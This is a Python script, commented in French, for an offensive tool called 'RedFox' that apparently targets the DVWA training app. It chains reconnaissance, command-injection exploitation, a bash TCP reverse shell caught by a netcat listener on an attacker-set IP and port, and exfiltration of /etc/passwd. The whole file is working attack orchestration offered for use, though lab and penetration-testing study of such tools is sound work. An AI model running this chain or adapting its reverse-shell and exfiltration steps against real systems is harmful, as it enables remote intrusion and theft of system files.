#!/usr/bin/env python3
"""
Orchestrateur interactif : reconnaissance → exploitation → reverse shell → post-exploitation
"""
import dvwa
import argparse, sys, subprocess, threading
import config, scanner, exploit, payloads, post_exploit
from utils import banner

def listener() -> None:
    """
    Démarre `nc -lvnp PORT` dans un thread pour laisser le menu actif.
    """
    banner(f"Ouverture du listener Netcat sur {config.LISTENER_PORT}")
    cmd = ["nc", "-lvnp", str(config.LISTENER_PORT)]
    subprocess.run(cmd)

def phase_reco() -> None:
    banner("Phase 1 : Reconnaissance")
    if not scanner.check_http():
        banner("Impossible de poursuivre sans service web.", "ERROR")

def phase_exploit(interactive: bool = False) -> None:
    banner("Phase 2 : Exploitation (commande de test : `id`)")
    html = exploit.run_command("id")
    if html and interactive:
        # Affiche juste la sortie brute dans le terminal pour l’utilisateur
        try:
            extract = html.split("<pre>")[-1].split("</pre>")[0]
            print(extract)
        except Exception:
            print(html[:400])  # fallback

def phase_reverse_shell() -> None:
    banner("Phase 3 : Reverse shell")
    #shell_cmd = payloads.bash_reverse_shell(config.LISTENER_IP, config.LISTENER_PORT)
    shell_cmd = payloads.bash_tcp_reverse(config.LISTENER_IP, config.LISTENER_PORT)
    t = threading.Thread(target=listener, daemon=True)
    t.start()
    exploit.run_command(shell_cmd)

def phase_exfiltration() -> None:
    banner("Phase 4 : Post-exploitation / exfiltration")
    post_exploit.exfiltrate("/etc/passwd")

def menu():
    actions = {
        "1": ("Reconnaissance",           phase_reco),
        "2": ("Exploitation",            lambda: phase_exploit(True)),
        "3": ("Reverse shell",            phase_reverse_shell),
        "4": ("Exfiltration",             phase_exfiltration),
        "0": ("Quitter",                  sys.exit)
    }
    while True:
        print("\n==== Menu RedFox ====")
        for k, (name, _) in actions.items():
            print(f"{k}. {name}")
        choice = input("> Choix : ").strip()
        action = actions.get(choice)
        if action:
            action[1]()
        else:
            banner("Choix invalide", "WARN")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="RedFox – chaîne d’exploitation automatisée")
    parser.add_argument("-a", "--all", action="store_true", help="enchaîner toutes les phases")
    args = parser.parse_args()

    if args.all:
        phase_reco()
        phase_exploit()
        phase_reverse_shell()
        phase_exfiltration()
    else:
        menu()
